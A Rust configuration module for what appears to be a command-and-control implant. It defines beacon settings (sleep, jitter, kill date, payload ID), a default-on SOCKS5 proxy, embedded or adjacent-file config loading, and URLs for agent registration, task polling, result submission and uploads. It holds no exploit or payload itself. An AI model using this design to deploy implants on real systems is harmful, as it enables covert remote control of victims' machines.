use serde::{Deserialize, Serialize};
use std::fs;
use std::io;
use std::path::Path;
use std::env;
use uuid::Uuid;

// Include the generated config file
include!(concat!(env!("OUT_DIR"), "/config.rs"));

#[derive(Serialize, Deserialize, Clone)]
pub struct AgentConfig {
    pub server_url: String,
    pub sleep_interval: u64,
    pub jitter: u64,
    pub kill_date: Option<String>,
    pub payload_id: String,
    pub protocol: String,
    pub socks5_enabled: bool,
    pub socks5_port: u16,
}

impl Default for AgentConfig {
    fn default() -> Self {
        Self {
            server_url: String::new(), // Empty string by default to force error if no config
            sleep_interval: 5,
            jitter: 2,
            kill_date: None,
            payload_id: String::new(), // Empty string by default
            protocol: String::from("http"),
            socks5_enabled: true,  // Enable by default
            socks5_port: 9050,     // Default SOCKS5 port
        }
    }
}

impl AgentConfig {
    pub fn load() -> io::Result<Self> {
        // First try using the embedded config
        if let Ok(config) = serde_json::from_str::<AgentConfig>(EMBEDDED_CONFIG) {
            if !config.server_url.is_empty() && !config.payload_id.is_empty() {
                println!("[INFO] Using embedded configuration");
                return Ok(config);
            }
            println!("[WARNING] Embedded config invalid (missing server_url or payload_id)");
        } else {
            println!("[WARNING] Failed to parse embedded config");
        }
        
        // Try filesystem config as fallback
        if let Ok(exe_path) = env::current_exe() {
            let exe_dir = exe_path.parent().unwrap_or(Path::new("."));
            let config_path = exe_dir.join("config.json");
            
            if config_path.exists() {
                if let Ok(contents) = fs::read_to_string(&config_path) {
                    if let Ok(config) = serde_json::from_str::<AgentConfig>(&contents) {
                        if !config.server_url.is_empty() && !config.payload_id.is_empty() {
                            println!("[INFO] Loaded valid config from {}", config_path.display());
                            return Ok(config);
                        }
                    }
                }
            }
        }

        // No valid config found
        Err(io::Error::new(io::ErrorKind::NotFound, "No valid configuration found"))
    }

    pub fn get_server_url(&self) -> String {
        if self.server_url.starts_with("http://") || self.server_url.starts_with("https://") {
            self.server_url.clone()
        } else {
            format!("{}://{}", self.protocol, self.server_url)
        }
    }
}

pub struct ServerConfig {
    pub server_url: String,
    pub sleep_time: u64,
    pub jitter: u64,
    pub uuid: String,
    pub registered: bool,
    pub agent_type: String,
    pub system_info: String,
    pub hostname: String,
    pub upload_dir: String,
}

impl Default for ServerConfig {
    fn default() -> Self {
        Self {
            server_url: String::from("http://localhost:8080"),
            sleep_time: 5,
            jitter: 2,
            uuid: Uuid::new_v4().to_string(),
            registered: false,
            agent_type: String::from("rust"),
            system_info: String::new(),
            hostname: String::new(),
            upload_dir: String::from("uploads"),
        }
    }
}

impl ServerConfig {
    pub fn new() -> Self {
        Default::default()
    }

    pub fn register_url(&self) -> String {
        format!("{}/api/agent/register", self.server_url)
    }

    pub fn get_task_url(&self) -> String {
        format!("{}/api/agent/{}/task", self.server_url, self.uuid)
    }

    pub fn submit_result_url(&self) -> String {
        format!("{}/api/agent/{}/result", self.server_url, self.uuid)
    }

    pub fn upload_path(&self) -> String {
        format!("{}/api/agent/{}/upload", self.server_url, self.uuid)
    }
}
